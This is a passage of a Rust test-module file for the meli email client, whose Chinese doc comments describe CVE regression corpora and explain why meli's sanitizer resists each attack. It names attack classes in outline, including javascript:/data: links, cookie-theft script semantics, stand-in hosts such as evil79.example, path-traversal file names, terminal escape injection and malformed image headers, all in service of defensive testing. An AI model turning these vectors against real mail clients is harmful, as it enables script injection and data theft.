/// 终端文本，没有第二次「浏览器 / SVG / SMIL 解析」可供碎片重组，也没有任何脚本 /
/// URL scheme / 动画执行器。
///
/// [`cve_2016_4068`] 以内嵌 `multipart/alternative` 语料（plain + html 双叶）与
/// 带 `image/svg+xml` 附件叶的 `multipart/mixed` 语料逐层锁定为**免疫证明，
/// 未发现缺口，无需改动生产代码**。语料与 CVE-2015-8864（issue #72）互补不重复，
/// 专精 SMIL 动画与引用元素：a `<animate>`/`<set>` 修改 `href`（issue 指定原形、
/// `xlink:href` 目标、`values` 多值、`from`/`to` 组合、`begin`/`dur`/
/// `repeatCount`/`fill` 时序变体、`attributeName` 大小写混淆、动画
/// `xlink:href="#target"` 指定 `<a>`/`<image>`/`<use>` 目标、隐式父目标）；
/// b SVG `use` 外链（`external.svg#x` 跨文档、`//evil.example/x.svg#e` 协议相对、
/// `data:image/svg+xml` URL 编码与 base64、同文档 script 片段、use 嵌套 use、
/// HTML 正文裸 `use`）；c 组合与混淆（`<animate>`/`<set>` 挂 `<use>`/`<image>`/
/// `<a>`、`animateTransform`/`animateMotion`/`mpath`、SMIL `begin` 事件链、
/// `discard`、嵌套 `<svg>` 动画、未闭合吞尾）；d 惰性边界（相对 / 片段 `use`、
/// 良性 `opacity`/`x` 动画属性、协议相对锚点，元素死亡或 `url_scheme` 为 `None`
/// 且确认门拒绝）。分层：L1 melib 解析出双叶 / 三叶且全部攻击字节逐字在场
/// （LF→CRLF 容忍），`image/svg+xml` 附件归类为 `ContentDisposition::Attachment`
/// 惰性附件、其动画字节绝不进入 HTML 显示管线；L2 sanitize 输出无任何非白名单
/// SVG / SMIL 标签（含 `animateTransform`/`animateMotion`/`discard`/`mpath`）、
/// 无 `on*` / `attributeName`/`values`/`from`/`to`/`begin`/`dur`/`xlink:href`
/// 属性、无活的危险 scheme href 且为不动点；L3 render 里动画 / 引用元素整体
/// 消失、动画属性值不出现、危险 scheme 不生成脚注，惰性边界如实记录且
/// `is_default_launchable_scheme` 拒绝；L4 整封攻击邮件端到端纯文本且诚实
/// `http`/`https`/`mailto` 链接保持可用（sanitize 保留、render 脚注可见、确认门
/// 放行），`l4_no_smil_or_webmail_execution_pathway_exists` 的注释记录全仓无
/// webmail / 浏览器 / SVG 渲染器 / JS 引擎 / SMIL 动画引擎通路的映射依据。
/// 仓内孪生改动：无（免疫证明，未触碰生产代码）。
///
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`cve_2016_4068`]: self::cve_2016_4068
#[cfg(test)]
#[path = "CVE-2016-4068.rs"]
mod cve_2016_4068;

/// CVE-2024-37384（Roundcube &lt; 1.5.7 / 1.6.x &lt; 1.6.7；CVSS 6.1，NVD）偏好
/// 字段 XSS regression（issue #74，表 3 of `SECURITY-CVE-RESEARCH.zh-CN.md` —
/// 网页嵌入）：Roundcube 把用户偏好里的列表列设置原样拼进 webmail HTML 页面
/// 而不过滤，偏好字段因此成为脚本注入点。meli 无 webmail / 浏览器 / DOM / JS
/// 引擎，偏好 = TOML 配置值，「列设置」等价面 = listing 渲染配置 + terminal
/// 显示配置；TOML 值永不经过 HTML 引擎，终端攻击等价物 = 配置值携带终端转义
/// 序列（CSI / OSC / BEL / C1 / ST）落进 tty 字节流被解释成活指令。
/// [`cve_2024_37384`] 证明 listing / 鼠标标志面免疫：生产接缝
/// `CellBuffer::write_string` 把控制字符标成空格子，`draw_horizontal_segment`
/// 从不发射，剥离完整转义序列后的 tty 残渣无任何控制字节；并暴露、修复一个
/// 真缺口——`terminal.window_title` 曾被原样拼进 OSC 2 序列，标题里的 BEL/ST
/// 可提前终止 OSC 串，其后字节成为活的终端指令。修复 = 新增
/// `meli::terminal::sanitize_osc_payload`（过滤全部 `char::is_control`）+
/// `write_set_window_title`（净化后发射，空则不发射），由 `screen.rs` 仓内孪生
/// `window_title_control_bytes_cannot_break_out_of_osc2` /
/// `window_title_honest_value_is_unchanged` 锁定完整线序；诚实配置渲染不变。
///
/// [`sanitize_osc_payload`]: meli::terminal::sanitize_osc_payload
/// [`write_set_window_title`]: meli::terminal::write_set_window_title
/// [`cve_2024_37384`]: self::cve_2024_37384
#[cfg(test)]
#[path = "CVE-2024-37384.rs"]
mod cve_2024_37384;

/// CVE-2025-48700（Synacor Zimbra Collaboration Suite，Zimbra Classic UI；NVD 未分配
/// CVSS 分数；CISA KEV 2026-04-20 收录，在野利用）存储型 XSS regression（issue #75，
/// 表 3 of `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入 / web/HTML embedding）：
/// KEV 原文记录攻击者可在受害会话内执行任意 JavaScript、可能触达敏感信息。
/// 与同族 CVE-2025-66376（CSS `@import` 标签切分 mXSS）互补，本语料聚焦 issue #75
/// 指定的**解析差异 / mXSS** 三大类：(1) math / `annotation-xml` 命名空间混淆；
/// (2) HTML / SVG / MathML 命名空间 `style` 文本重组；(3) 属性引号差异
/// （无引号 / 单引号 / 双引号 / 反引号 / 缺右引号吞尾 / 引号内 tab-LF-CR）。
///
/// meli 等价面映射（issue #75 明确要求）：meli 是终端邮件客户端，**没有 webmail
/// 功能面**——没有 HTTP 页面、会话 Cookie、浏览器 DOM、JavaScript 引擎，也没有把
/// 邮件 HTML 注入页面的服务端清洗器。邮件 HTML 唯一的消费通路是邮件视图的显示
/// 管线 [`sanitize`]（ammonia 白名单：html5ever **恰好一次**解析 → 过滤树 → 带转义
/// 再序列化）→ [`render`]（html2text → 纯终端文本）。mXSS 的成立前提是"清洗后的
/// 字符串被第二次交给 HTML 解析器"，而 meli 只解析一次、输出面向纯文本，攻击链在
/// 结构上即断：ammonia 的 `check_expected_namespace` 对 HTML/SVG/MathML 命名空间
/// 切换做白名单检查，不合法的切换连整棵子树删除；`script`/`style` 属
/// `clean_content_tags` 连内容整体删除；`tag_attributes` 整体替换只留
/// `a[href]`/`a[title]` 与通用 `{lang,title}`；`url_schemes` 只有 http/https/mailto，
/// `href` 经 `attribute_filter` trim 首尾不可见填充后**重新**校验（CVE-2025-66376
/// 时代硬化）；序列化时属性值内的 `&`/`"`/`<`/`>` 被转义，引号差异无法再生标签边界。
///
/// [`cve_2025_48700`] 以内嵌 `multipart/alternative` 语料（plain + html 双叶）
/// 逐层锁定为**免疫证明，未发现缺口，无需改动生产代码**。语料与 CVE-2025-66376
/// `TAG_SPLITTING_CORPUS` 的 12 个 payload **逐字不重复**（同族不同形），三大类各
/// ≥ 6、总数 45 个向量，每个向量都过独立惰性预言机（`scan_tags` 白名单扫描 +
/// 无 `on*`/禁止属性 + 无活的危险 scheme href + `sanitize` 不动点）。分层：L1 melib
/// 解析出双叶且全部攻击字节逐字在场（LF→CRLF 容忍），并自检三大类规模与命名唯一性；
/// L2 sanitize 输出无任何非白名单 math/SVG/style 标签、无 `on*`、无活的危险 scheme
/// href 且为不动点；L3 render 里 script/style 脚本体与危险 scheme 脚注整体消失，
/// 引号内嵌标记只解出惰性字面文本，惰性边界的 `url_scheme` 为 `None` 且确认门拒绝；
/// L4 整封攻击邮件端到端纯文本且诚实 `http`/`https`/`mailto` 链接保持可用
/// （sanitize 保留、render 脚注可见、`is_default_launchable_scheme` 放行），
/// `l4_no_webmail_script_pathway_exists` 的注释记录全仓无 webmail / 浏览器 / JS 引擎 /
/// 第二次 HTML 解析通路的映射依据。仓内孪生改动：无（免疫证明，未触碰生产代码）。
///
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`cve_2025_48700`]: self::cve_2025_48700
#[cfg(test)]
#[path = "CVE-2025-48700.rs"]
mod cve_2025_48700;

/// CVE-2026-73572（Synacor Zimbra Collaboration Suite，Zimbra Classic UI；NVD 未分配
/// CVSS 分数；来源 Zimbra 官方安全公告）**存储型 XSS** regression（issue #76，
/// 表 3 of `SECURITY-CVE-RESEARCH.zh-CN.md` 第 127 行 — 网页嵌入 / web/HTML
/// embedding）：报告原文记录攻击者在受害者预览恶意邮件附件时让附件内容执行脚本。
/// 与同族 CVE-2025-48700（正文 mXSS）、CVE-2025-66376（CSS `@import` 标签切分）互补，
/// 本语料聚焦 issue #76 指定的**附件预览面**四类：(1) `text/html` 附件带 `<script>` /
/// 事件属性 / `javascript:` / `data:` / `document.cookie` 窃取语义；(2)
/// `image/svg+xml` 附件带 `<script>` / `onload` / `<foreignObject>` / `xlink:href` /
/// SMIL `<animate>`；(3) inline `Other`/`OctetStream` 原样文本载体（含 ESC/CSI/OSC/
/// BEL/C1 终端控制序列）；(4) `multipart/mixed`、`multipart/related` 嵌套与
/// Content-Type 混写伪装（`image/svg+xml` 带 charset、附件名伪装 `.txt`/`.jpg`/`.png`）。
///
/// meli 等价面映射（issue #76 明确要求）：meli 是终端邮件客户端，**没有 webmail
/// 功能面**——没有 HTTP 页面、会话 Cookie、浏览器 DOM、JavaScript / SMIL 引擎，也
/// 没有把附件内容注入页面的预览器。附件消费路径逐环检查：`Content-Disposition:
/// attachment` 只以元数据进列表（`meli/src/mail/view/envelope.rs:321`）；inline
/// `text/html` 经 `ViewFilter::new_html`（`filters.rs:146`）→ [`sanitize`]（ammonia
/// 白名单恰好一次解析 → 过滤树 → 带转义序列化）→ [`render`]（html2text → 纯文本）；
/// inline `Other`/`OctetStream` 走原样纯文本（`filters.rs:405`），控制字符在网格层
/// 被 `CellBuffer::write_string`（`terminal/cells.rs:715`）标成空格子、发射器
/// `Screen::draw_horizontal_segment`（`screen.rs:582`）只在 `!c.empty()` 时写字符；
/// `image/svg+xml` 属 `ContentType::Other`，要么只显示元数据，要么在用户显式输入
/// 附件编号 + 按键后（`envelope.rs:2029` `open_attachment` / `envelope.rs:1858`
/// `open_mailcap` 均要求 `context.cmd_buf().is_some()`）交给本地桌面默认程序
/// （`envelope.rs:2072` `query_default_app` + `sh -c`），meli 自身从不解析 SVG。
///
/// 缺口检测结论：`query_default_app(attachment.mime_type())` 只把邮件可控 MIME
/// 字符串当查询键做相等比较（`melib/src/utils/xdg/mod.rs:239`），不拼接 shell；
/// `File::create_temp_file` 对邮件可控 filename 先 `sanitize_filename` 再截断
/// （`meli/src/types/helpers.rs:85`）；inline 原样文本分支的控制序列在网格层被
/// 消灭——本语料 `l2_inline_other_terminal_controls_never_reach_the_grid` 直接断言
/// 网格里 `cell.empty() || !cell.ch().is_control()`。**免疫证明，未发现缺口，无需
/// 改动生产代码**。
///
/// [`cve_2026_73572`] 以内嵌 `multipart/mixed` 附件语料逐层锁定：L1 melib 解析出
/// 多层附件树（HTML attachment 叶 / SVG attachment 叶 / ≥ 8 个 inline
/// Other/OctetStream 叶 / 嵌套 related 与 mixed），四类各 ≥ 6、总数 30 个向量逐字
/// 在场（LF→CRLF 容忍），并自检规模、命名唯一性与同族参考语料独有片段的逐字不重复；
/// L2 sanitize 输出无任何非白名单标签、无 `on*`、无活的危险 scheme href 且为不动点，
/// render 纯终端文本，inline 控制序列不进入网格；L3 `url_scheme` /
/// `is_default_launchable_scheme` 对 `javascript:`/`vbscript:`/`data:`/`file:`/`blob:`
/// 拒绝免确认启动、对 `http`/`https`/`mailto` 放行（诚实对照）；L4 整封攻击邮件逐
/// HTML 附件叶端到端纯文本且诚实链接保持可用，
/// `l4_no_webmail_or_svg_engine_pathway_exists` 的注释记录全仓无 webmail / 浏览器 /
/// SVG 渲染器 / JS / SMIL 引擎 / 第二次 HTML 解析通路的映射依据。仓内孪生改动：无
/// （免疫证明，未触碰生产代码）。
///
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`cve_2026_73572`]: self::cve_2026_73572
#[cfg(test)]
#[path = "CVE-2026-73572.rs"]
mod cve_2026_73572;

/// CVE-2021-29956（Mozilla Thunderbird 78.8.1–78.10.1；CVSS 4.3，CWE-312）**导入
/// 的 OpenPGP 私钥在未设置主密码时明文写入本地 keystore** regression（issue
/// #102）。Thunderbird 把用户导入的私钥存进自有 `key4.db`/secring 式 keystore，
/// 无 primary password 时不加口令保护，任何能读本地文件的攻击者扫描其
/// profile/数据目录即可原样窃取；投递形态是一封携带
/// `-----BEGIN PGP PRIVATE KEY BLOCK-----` 的「请导入新私钥」邮件。
///
/// meli 等价面映射：meli **没有私有 keystore**——唯一导入 API 是
/// [`Context::import_key`]（gpgme `gpgme_op_import`），私钥直接进 GnuPG 自己的
/// `GNUPGHOME/private-keys-v1.d/`，由 gpg-agent 掌管口令保护域；meli 生产代码
/// 没有任何 `import_key` 调用点（调用点只在 `#[cfg(test)]` 测试里），没有把
/// `application/pgp-keys` 解释成导入动作的分发（它落 `ContentType::Other` 不透明
/// 载荷），gpgme bindings 无 `gpgme_op_export`，[`Key`] 仅有
/// `secret(&self) -> bool` 布尔访问器、绝不返回字节。
///
/// [`cve_2021_29956`] 分层锁定为**免疫证明，未发现缺口，无需改动生产代码**：
/// L1 用 `Envelope::from_bytes` + 附件树解析攻击邮件（内联 armor + 真实
/// `application/pgp-keys` 附件），证明私钥字节只以不透明附件/正文形式可达；L2
/// 源码扫描证明无导入入口、无导出 API、Key 只有布尔句柄；L3 用真 gpgme 把攻击
/// 邮件里提取的私钥经唯一导入 API 导入，再递归扫描 scratch `XDG_CONFIG_HOME`/
/// `XDG_DATA_HOME`/`HOME`/cwd `log`/`<tmp>/meli` 证明私钥特征字节全空，阳性对照
/// 证明同一 needle 只落在 scratch `GNUPGHOME` 的 gpg-agent 域；L3d 证明 gpgme I/O
/// 回调只记录事件、不 dump 数据缓冲。草稿面依 CVE-2008-4491 的策略面记录（正文
/// armor 只能经用户显式动作进入草稿，属用户内容）。
///
/// [`Context::import_key`]: meli::melib::gpgme::Context::import_key
/// [`Key`]: meli::melib::gpgme::Key
/// [`cve_2021_29956`]: self::cve_2021_29956
#[cfg(test)]
#[path = "CVE-2021-29956.rs"]
mod cve_2021_29956;

/// CVE-2021-30858（WebKit；NVD 未分配 CVSS 分数；Apple 2021-09-13 紧急修复
/// iOS 14.8 / iPadOS 14.8 / Safari 14.1.2 等，WebKitGTK 同步收录 WSA-2021-0020；
/// Apple 确认在野利用，匿名研究者报告）**use-after-free → 任意代码执行**
/// regression（issue #77，表 4 of `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入 /
/// web/HTML embedding）：Apple 公告原文 *"A use after free issue was addressed
/// with improved memory management"*，攻击面是 Apple Mail 的 HTML 渲染引擎，
/// 邮件 HTML 即投递面。与同族 CVE-2025-48700（正文 mXSS）、CVE-2015-8864（SVG
/// 脚本 / 事件）、CVE-2026-73572（附件预览存储型 XSS）、CVE-2025-66376
/// `TAG_SPLITTING_CORPUS`（CSS `@import` 标签切分）逐字不重复，本语料聚焦 issue
/// #77 指定的 UAF 触发型两类面：(1) DOM 操作差异——深度嵌套 / 错配嵌套、active
/// formatting elements 重建与 adoption agency、table foster parenting、
/// `form`/`template` 交互、`p`-in-body 自动闭合、raw text 吞尾；(2) 命名空间
/// 混淆——SVG / MathML foreign content、`annotation-xml`/`mtext`/`mglyph` 积分点、
/// `foreignObject`、CDATA / 注释切分、大小写与实体混淆。
///
/// meli 等价面映射（issue #77 明确要求）：meli 是终端邮件客户端，**没有 WebKit /
/// 浏览器 DOM / JavaScript 引擎 / webmail 页面**。邮件 HTML 唯一的消费通路是
/// 邮件视图的显示管线 [`sanitize`]（ammonia 白名单：html5ever **恰好一次**规范
/// 解析 → 过滤树 → 带转义再序列化）→ [`render`]（html2text → 纯终端文本）。
/// UAF→RCE 在结构上不可表达（安全 Rust、无内存不安全宿主对象、`script`/`style`
/// 连内容删除、`svg`/`math`/`foreignObject` 非白名单、`on*` 随元素死亡、
/// `url_schemes` 只有 http/https/mailto 且 `href` 经 trim 后重新校验）；唯一的
/// 内存安全等价面是无界递归（CWE-674），因为 Rust 无法 catch 栈溢出。
///
/// [`cve_2021_30858`] 以内嵌 `multipart/alternative` 语料（plain + html 双叶）
/// 逐层锁定为**免疫证明，未发现缺口，无需改动生产代码**。语料两大类各 ≥ 6、
/// 总数 46 个向量（DOM 差异 24 + 命名空间混淆 22），每个向量都过独立惰性预言机
/// （`scan_tags` 白名单扫描 + 无 `on*`/危险 scheme + `sanitize` 不动点）。分层：
/// L1 melib 解析出双叶且全部攻击字节逐字在场（LF→CRLF 容忍），并自检两类规模、
/// 命名唯一性与同族参考语料长片段的逐字不重复；L2 sanitize 输出无任何非白名单
/// script/style/SVG/MathML/form/select/template 标签、无 `on*`、无活的危险 scheme
/// href 且为不动点；L3 render 脚本体 / 事件属性值 / 危险 scheme 目标整体消失，
/// 不生成危险链接脚注，惰性边界 `url_scheme` 为 `None` 且
/// `is_default_launchable_scheme` 拒绝；L4 整封攻击邮件端到端纯文本且诚实
/// `http`/`https`/`mailto` 链接保持可用（sanitize 保留、render 脚注可见、确认门
/// 放行）。重点探针
/// `probe_sanitize_and_render_survive_deep_nesting_on_strict_stack` 在
/// `stack_size(2 MiB)` 线程（对齐 meli view 线程栈，同 issue #23 的 2 MiB 说明）
/// 上对 50000 层未闭合 `<b>` 链、`<table><tr><td>` 链、混合错配链与 balanced
/// `<div>` 移除链（后者只跑 `render`，其第一步即 `sanitize`），另加为限制 CI 时间
/// 收窄到 10000 层的 adoption agency 错配链跑 sanitize + render，全部存活、
/// 不 panic / 不栈溢出、输出纯文本。仓内孪生改动：无（免疫证明，未触碰生产代码）。
///
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`cve_2021_30858`]: self::cve_2021_30858
#[cfg(test)]
#[path = "CVE-2021-30858.rs"]
mod cve_2021_30858;

/// CVE-2023-4863（libwebp；CVSS 8.8；2023-09 在野利用；Chrome / Firefox /
/// Thunderbird 共用同一份 libwebp）**VP8L 无损位流 Huffman 编码表构建堆缓冲区
/// 溢出** regression（issue #78，表 4 of `SECURITY-CVE-RESEARCH.zh-CN.md` —
/// e-mail-reachable browser engines）：`ReadHuffmanCodes` /
/// `BuildHuffmanTable` 对 attacker 控制的 code-length 符号表写出越界，含
/// WebP 图片的邮件只要被打开就在进程内解码并触发。meli 是终端邮件客户端，
/// **没有浏览器引擎、没有 DOM / JS、也没有任何内嵌图片解码器**，本 CVE 的
/// 触发原语在结构上不存在。
///
/// [`cve_2023_4863`] 以内嵌「等价结构」恶意 WebP 语料（真 `RIFF` + 小端 size +
/// `WEBP` 魔数的 VP8 / VP8L / VP8X+ALPH+ANIM+ANMF 容器，与截断畸形变体，共
/// 20+ 向量；投递形态覆盖 `Content-Disposition: attachment` 叶、inline
/// `image/webp`、伪装 `application/octet-stream` + `.webp` 文件名、
/// `multipart/related` + HTML `<img src="cid:…">` 引用、嵌套
/// `message/rfc822`）逐层锁定为**免疫证明，未发现缺口，未触碰生产代码**。
/// L1 melib 解析出精确的 `multipart/mixed` 附件树，全部语料字节在 wire 上逐字
/// 在场，`image/webp` 归类 `ContentType::Other { tag: b"image/webp" }`、
/// `is_text() == false`，伪装 `application/octet-stream` + `.webp` 文件名按
/// Content-Type 归类（`ContentType::Other { tag: b"application/octet-stream" }`，
/// 不看扩展名；`ContentType::OctetStream` 是程序化构造形），且
/// [`Attachment::decode`] 只做 base64 / quoted-printable 传输编码反转、其余字节
/// 原样返回，无任何 WebP 结构解释；L2 WebP 叶进入 `AttachmentDisplay::Attachment`
/// 元数据条目（文件名 / 大小 / MIME），`multipart/related` 里的 `cid:` / `data:`
/// / 远程 WebP 引用在 [`sanitize`] 里整体死亡（`img`/`object`/`embed`/`iframe`/
/// `source` 非白名单，scheme 只有 http/https/mailto），[`render`] 输出纯终端文本；
/// L3 打开 WebP 只经 `open_mailcap` / `open_attachment` 两条汇，两者都以
/// `context.cmd_buf().is_some()`（先输入附件编号）为前置，命中后字节只落入
/// `<temp_dir>/meli/` 的 `0o600` 随机名临时文件并交给进程外程序，语料同时断言
/// 整个 workspace 清单无任何内嵌图片解码依赖（`l3_workspace_has_no_in_process_
/// image_decoder_dependency`）；L4 整封攻击邮件端到端解析 + 渲染纯文本，合法
/// 内容交付、WebP 字节 / 引用不出现，诚实 `http`/`https`/`mailto` 链接保持可用。
/// WebP 门禁的仓内孪生回归为 `meli/src/mail/view/tests.rs` 的
/// `cve_2023_4863_webp_attachments_render_as_metadata_only` 与
/// `cve_2023_4863_open_attachment_requires_explicit_attachment_number`。
///
/// [`Attachment::decode`]: meli::melib::Attachment::decode
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`cve_2023_4863`]: self::cve_2023_4863
#[cfg(test)]
#[path = "CVE-2023-4863.rs"]
mod cve_2023_4863;

/// CVE-2023-41061（Apple Wallet / PassKit；Apple 公告原文 *"A validation issue
/// was addressed with improved logic"*；2023-09 在野利用；与 CVE-2023-41064 组成
/// BLASTPASS 零点击链，经 iMessage 附件投递，Citizen Lab / Lookout 归因）**附件
/// 校验绕过 → 任意代码执行** regression（issue #79，表 4 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md`）：iOS/iPadOS/watchOS 的 Wallet 对伪造 Apple
/// Wallet `.pass` 附件的校验被绕过——`.pass` 本质是一个 ZIP 归档（`pass.json` /
/// `manifest.json` / `logo.png` / `zh-CN.lproj/pass.strings` 等条目），Wallet 在
/// 检查 SHA1 清单与结构约束时逻辑不完善，恶意 `.pass` 被当作合法凭证处理；链上
/// 再配合 CVE-2023-41064（ImageIO 处理 `.pass` 内嵌恶意 PNG 的缓冲区溢出）完成
/// 代码执行。攻击面对邮件客户端附件处理同等适用。
///
/// meli 等价面映射（issue #79 明确要求）：meli 是终端邮件客户端，**没有 Wallet /
/// PassKit 解析器、没有 ZIP 归档解析器、也没有任何内嵌图片解码器**。本 CVE 的触发
/// 原语在结构上不存在。`Content-Disposition: attachment` 叶只以元数据进列表；
/// `.pass` / `application/zip` / `application/octet-stream` 在 melib 解析路径
/// 按 Content-Type 归为 `ContentType::Other { tag }`、`is_text() == false`（不看
/// 扩展名），[`Attachment::decode`] 只做 base64 / quoted-printable / 8bit 传输编码
/// 反转，不做任何 ZIP 记录头 / EOCD / PassKit / PNG 结构解释；inline `Other` 原样
/// 文本分支只把已到达字节当纯文本；`multipart/related` 的 `<img src="cid:…">` /
/// `data:application/vnd.apple.pass;…` / 远程 `https://evil79.example/x.pass` /
/// `<object>` / `<embed>` / `<iframe>` 引用在 [`sanitize`]（ammonia 白名单，`img` /
/// `object` / `embed` / `iframe` / `source` 非白名单，URL scheme 只有
/// http/https/mailto）里整体死亡；打开 `.pass` 只有 `open_mailcap` 与
/// `open_attachment` 两条汇，两者都以 `context.cmd_buf().is_some()`（先输入附件
/// 编号）为前置，命中后字节经 `sanitize_filename` 压平路径穿越再落入
/// `<temp_dir>/meli/` 的 `0o600` 随机名临时文件、交给进程外程序。
///
/// [`cve_2023_41061`] 以内嵌「等价结构」伪造 `.pass` 语料（真 `PK\x03\x04` 本地
/// 文件头 + `PK\x01\x02` 中央目录 + `PK\x05\x06` EOCD 的 stored 容器，逐条内嵌
/// 恶意 `pass.json`（http `webServiceURL` 信标 / `backFields` script 事件载荷 /
/// `authenticationToken` / 畸形 barcodes）、伪造 40 位十六进制 SHA1 的
/// `manifest.json`、IHDR 声明尺寸与实际数据失配的畸形 PNG、`zh-CN.lproj/
/// pass.strings` 本地化嵌套目录；外加 `PK\x06\x07` ZIP64 EOCD locator 混淆与
/// 截断 / 篡改 EOCD 变体，共 18 个 ZIP 向量；投递形态覆盖正确申报
/// `application/vnd.apple.pass`、伪装 `application/zip` 与
/// `application/octet-stream` + `.pass` 文件名、RFC 2231 `filename*=UTF-8''…%2Epass`
/// 与 `filename*0=`/`filename*1=` 分段拼写、inline vs attachment、双扩展
/// `boarding79.pass.txt`、`text/plain` 伪装、路径穿越 `../../evil79.pass`、
/// `multipart/related` + `<img src="cid:pass79@evil79.example">`、嵌套
/// `message/rfc822`，共 11 个投递向量；另有 7 个 HTML 引用向量）逐层锁定为
/// **免疫证明，未发现缺口，未触碰生产代码**。
///
/// L1 melib 解析出精确的 `multipart/mixed` 附件树（19 个根部件），全部语料字节在
/// wire 上逐字在场，`application/vnd.apple.pass` / `application/zip` /
/// `application/octet-stream` 归类 `ContentType::Other`、`is_text() == false`，
/// [`Attachment::decode`] 只做传输编码反转（8bit 原样、base64 `UEsDBA==` →
/// `PK\x03\x04`、quoted-printable 同已知答案），无任何 ZIP / PassKit / PNG 结构
/// 解释；L2 `.pass` 叶只以元数据条目显示，HTML 引用在 [`sanitize`] 里整体死亡且为
/// 不动点，inline `Other` 原样分支惰性；L3 源码扫描锁定 `open_mailcap` /
/// `open_attachment` 的 `cmd_buf().is_some()` 前置，路径穿越文件名经
/// `sanitize_filename` / `sanitize_filename_component` 不产生目录分量，
/// `l3_workspace_has_no_zip_or_archive_parser_dependency` 断言全仓清单无任何
/// ZIP / 归档解析依赖，`l3_flate2_is_only_used_outside_attachment_paths` 断言
/// `flate2` 的使用点仅为协议连接层（`melib/src/utils/connections.rs`）、本地
/// manpage 资产（`meli/src/manpages.rs`）、可选补丁抓取工具
///（`melib/src/utils/patch_retrieve.rs`）与测试代码（`meli/src/sqlite3/tests.rs`），
/// `melib/src/email/` 下零引用；L4 整封攻击邮件端到端解析 + 渲染纯文本，合法内容
/// （`LEGITIMATE-MARKER-79`）交付、`.pass` 字节 / 引用不出现，诚实
/// `http`/`https`/`mailto` 链接保持可用（sanitize 保留 href、render 脚注可见、
/// 确认门放行）。仓内孪生改动：无（免疫证明，未触碰生产代码）。
///
/// [`Attachment::decode`]: meli::melib::Attachment::decode
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`cve_2023_41061`]: self::cve_2023_41061
#[cfg(test)]
#[path = "CVE-2023-41061.rs"]
mod cve_2023_41061;

/// CVE-2023-41064（Apple ImageIO；Apple 公告原文 *"A buffer overflow issue was
/// addressed with improved memory management"*；2023-09 在野利用；与
/// CVE-2023-41061 组成 BLASTPASS 零点击链，经 iMessage 附件投递，Citizen Lab /
/// Lookout 披露，修复于 iOS 16.6.1）**图片缓冲区溢出 → 任意代码执行** regression
/// （issue #80，表 4 of `SECURITY-CVE-RESEARCH.zh-CN.md` — e-mail-reachable
/// browser engines）：ImageIO 解析恶意图片时对**元数据头**缺乏边界检查——
/// IFD0 偏移 / entry count / 声明的 ImageWidth / ImageLength / StripOffsets /
/// StripByteCounts / EXIF IFD 指针都可被声明为远超实际数据容量的值，越界读 /
/// 写破坏堆内存；BLASTPASS 链中触发点正是 `.pass` 归档内嵌的 TIFF 形态图片。
///
/// meli 等价面映射（issue #80 明确要求）：meli 是终端邮件客户端，**没有浏览器
/// 引擎、没有 ImageIO、也没有任何内嵌图片解码器**。本 CVE 的触发原语在结构上
/// 不存在。`Content-Disposition: attachment` 叶只以元数据进列表；`image/tiff` /
/// `image/heic` / `image/heif` / `image/jpeg` 与伪装成
/// `application/octet-stream` 的图片部件在 melib 解析路径按 Content-Type 归为
/// `ContentType::Other { tag }`、`is_text() == false`（不看扩展名），
/// [`Attachment::decode`] 只做 base64 / quoted-printable / 8bit 传输编码反转，
/// 不做任何 TIFF IFD / ISO-BMFF box / JPEG 段结构解释；inline `Other` 原样文本
/// 分支只把已到达字节当纯文本；`multipart/related` 的 `<img src="cid:…">` /
/// `data:image/tiff|heic|jpeg;…` / 远程 `https://evil80.example/x.tiff` /
/// `<object>` / `<embed>` / `<iframe>` / `<picture><source>` / `data:` 锚点引用在
/// [`sanitize`]（ammonia 白名单，`img` / `object` / `embed` / `iframe` / `source`
/// 非白名单，URL scheme 只有 http/https/mailto）里整体死亡；打开图片只有
/// `open_mailcap`（`meli/src/mail/view/envelope.rs:1859`）与 `open_attachment`
/// （同文件 `:2030`）两条汇，两者都以 `context.cmd_buf().is_some()`（先输入附件
/// 编号）为前置，命中后字节经 `sanitize_filename` 压平路径穿越再落入
/// `<temp_dir>/meli/` 的 `0o600` 随机名临时文件、交给进程外程序。
///
/// [`cve_2023_41064`] 以内嵌「等价结构」畸形图片语料（真 `II*\0` / `MM\0*` TIFF
/// 魔数 + IFD 记录；真 ISO-BMFF `ftyp` + `meta` + `iloc`/`iinf`/`infe`/`iprp`/
/// `ipco` 子盒；真 JPEG `FFD8` SOI + APP0/APP1/SOF0/SOF2/DQT/DHT/SOS 段，逐族
/// 内嵌「声明尺寸 / 偏移 / 长度远超实际数据」的越界元数据头形态）逐层锁定为
/// **免疫证明，未发现缺口，未触碰生产代码**。语料共 26 个向量：TIFF 8（双字节序、
/// IFD0 偏移 0xFFFFFFFF、entry count 0xFFFF、ImageWidth/ImageLength=0xFFFFFFFF、
/// StripOffsets/StripByteCounts 越界、EXIF IFD 指针越界（BLASTPASS 等价形态）、
/// IFD 头后截断、IFD 链自环）、HEIF/HEIC 9（`iloc` v2 extent u64 越界、
/// construction_method=1 指向 `idat`、`meta` size=0、size=1 + 64 位 largesize
/// 越界、`iinf` entry_count 0xFFFF、`infe` 截断、`pitm` 指向不存在条目、
/// `meta`+`mdat`、`ftyp` 后截断）、JPEG 9（APP0/JFIF 长度失配、APP1/Exif 内嵌
/// 越界 TIFF 头、SOF0/SOF2 声明 0xFFFF×0xFFFF、DQT/DHT 符号计数失配、SOS 前
/// 截断、缺 EOI、SOS 后无扫描数据）；投递形态 16（正确申报四种图片 MIME、伪装
/// `application/octet-stream` + `.tiff`/`.heic`/`.jpg` 文件名、base64 / quoted-printable
/// 传输编码、RFC 2231 `filename*=UTF-8''board80%2Etiff` 与 `filename*0=`/
/// `filename*1=` 分段拼写、inline vs attachment、双扩展 `board80.tiff.txt`、
/// `text/plain` 伪装、路径穿越 `../../evil80.tiff`、`multipart/related` +
/// `<img src="cid:image80@evil80.example">`、嵌套 `message/rfc822`）；另有 10 个
/// HTML 引用向量。所有语料字节均以 8bit 形式逐字上线（固定投递部件 +
